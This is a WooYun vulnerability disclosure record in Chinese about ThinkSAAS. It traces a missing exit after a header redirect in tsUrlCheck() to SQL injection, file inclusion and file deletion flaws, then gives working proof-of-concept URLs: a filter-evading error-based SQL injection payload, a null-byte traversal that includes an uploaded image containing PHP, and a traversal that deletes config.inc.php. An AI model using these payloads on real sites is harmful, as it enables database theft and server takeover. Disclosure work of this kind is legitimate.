{"id": 39136, "wybug_id": "wooyun-2015-094711", "wybug_title": "ThinkSAAS最新版漏洞打包", "wybug_corp": "thinksaas.cn", "wybug_author": "Kavia", "wybug_date": "2015-02-03 09:29", "wybug_open_date": "2015-05-07 18:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向公众公开  简要描述： SQL注入+文件包含+...向xfkxfk牛学习，多个漏洞打包，希望走一个大厂商流程。 详细说明：  最新版中tsUrlCheck()函数引发了多个漏洞\\thinksaas\\tsFunction.php\nfunction tsUrlCheck($parameter) {\t\t$parameter = trim($parameter);\t//echo $parameter;exit();\t$arrStr = str_split($parameter);\t$strOk = '%-_1234567890abcdefghijklmnopqrstuvwxyz';\tforeach ($arrStr as $key => $item) {\t\tif (stripos($strOk, $item) === false) {\t\t\t//qiMsg('非法URL参数！');\t\t\theader('Location: /');\t\t}\t}\treturn $parameter;}\n检查传入的参数存在非$strOk变量中的字符时，就是用header跳转。但是没有使用exit()来退出，所以程序依然会继续往下执行。那么问题来了！1、第一处SQL注入：\\app\\tag\\action\\add.php\ncase \"do\":\t\t\t$objname = tsFilter($_POST['objname']);\t\t$idname = tsFilter($_POST['idname']);\t\t$objid = intval($_POST['objid']);\t\t$tags = t($_POST['tags']);\t\t\t\t$new['tag']->addTag($objname,$idname,$objid,$tags);\n$objname和$idname可控，而tsFilter()函数只进行了简单的过滤，可以被绕过，参考： WooYun: ThinkSAAS最新版绕过过滤继续注入 之后两个可控变量进入addTag()\\app\\tag\\class.tag.php\nfunction addTag($objname,$idname,$objid,$tags){\t\t\t$objname = tsUrlCheck($objname);\t\t$idname = tsUrlCheck($idname);\t\t$objid = intval($objid);\t\t\tif($objname != '' && $idname != '' && $objid!=0 && $tags!=''){\t\t\t$tags = str_replace ( '，', ',', $tags );\t\t\t$arrTag = explode(',',$tags);\t\t\tforeach($arrTag as $item){\t\t\t\t$tagname = t($item);\t\t\t\tif(strlen($tagname) < '32' && $tagname != ''){\t\t\t\t\t$uptime = time();\t\t\t\t\t\t\t\t\t\t$tagcount = $this->findCount('tag',array(\t\t\t\t\t\t'tagname'=>$tagname,\t\t\t\t\t));\t\t\t\t\t\t\t\t\t\tif($tagcount == '0'){\t\t\t\t\t\t\t\t\t\t\t\t$tagid = $this->create('tag',array(\t\t\t\t\t\t\t'tagname'=>$tagname,\t\t\t\t\t\t\t'uptime'=>$uptime,\t\t\t\t\t\t));\t\t\t\t\t\t\t\t\t\t\t\t$tagIndexCount = $this->findCount('tag_'.$objname.'_index',array(\t\t\t\t\t\t\t$idname=>$objid,\t\t\t\t\t\t\t'tagid'=>$tagid,\t\t\t\t\t\t));\n$objname和$idname进入$this->findCount()$objname在表名处、$idname在作为$key，传入findCount()跟进findCount()可以发现没有对$key进行过滤，并且没有被引号包裹，所以不受GPC限制。因为此处有header会跳转，并且thinksaas报错不回显，所以需要有其他方式得到注入信息。参考： WooYun: Thinksaas最新版注入无视GPC 可以知道thinksaas所有的mysql报错信息都会被记录在一个日志文件中，所以使用报错注入就可以成功了。2、第二处SQL注入：\\app\\tag\\action\\add_ajax.php\ncase \"do\":\t\t\t$objname = tsUrlCheck($_POST['objname']);\t\t$idname = tsUrlCheck($_POST['idname']);\t\t$objid = intval($_POST['objid']);\t\t$tags = t($_POST['tags']);\t\t\t\t$new['tag']->addTag($objname,$idname,$objid,$tags);\n这里则直接用tsUrlCheck()检查POST数据的情况，连tsFilter()都没有使用。之后的分析与1相同3、任意文件包含：\\thinksaas\\thinksaas.php\n$app = isset($_GET['app']) ? tsUrlCheck($_GET['app']) : 'home';...include 'app/' . $app . '/config.php';\nGET的参数只因果tsUrlCheck检查就传入了include。所以可以通过截断，直接包含任意文件。4、任意文件删除：/app/system/action/plugin.php\ncase \"delete\":\t\t$apps = tsUrlCheck($_GET['apps']);\t\t$pname = tsUrlCheck($_GET['pname']);\t\t\t\tdelDir('plugins/'.$apps.'/'.$pname);\n同样$apps和$pname只经过了tsUrlCheck的检测，就进入了危险函数。两个变量用户都可控，不需要截断，想怎么删就这么删。不过由于该操作只能管理员操作，所以需要配合CSRF使用   漏洞证明：  1、注入：给出复杂一些的第一处SQL注入的演示和exp：exp：http://192.168.226.131/thinksaas/index.php?app=tag&ac=add&ts=do\nobjname=article&idname=1=1 anand d (selselect ect 1 frfrom om(selselect ect cocount unt(*),concat((selselect ect (selselect ect (selselect ect user())) frfrom om information_schema.tables limit 0,1),floor(rand(0)*2))x frfrom om information_schema.tables group bby y x)a)/*&objid=3&tags=5\n\n\n2、文件包含：首先在上传头像处上传一个插了php代码的图片\n\n\n\n接着访问，进行包含：http://192.168.226.131/thinksaas/index.php?app=../cache/user/0/0/120/2.jpg%00a在根目录下生成一个1.php\n\n3、任意文件删除：以管理员身份，访问：http://192.168.226.131/thinksaas/index.php?app=system&ac=plugin&ts=delete&apps=..&pname=data/config.inc.php因为thinksaas通过判断是否存在config.inc.php，来判断是否进行过安装，所以删除该文件后，就可以进行再次安装。   修复方案：  header之后记得exit   版权声明：转载请注明来源 Kavia@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-02-06 18:36 厂商回复： 感谢反馈，新年快乐。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}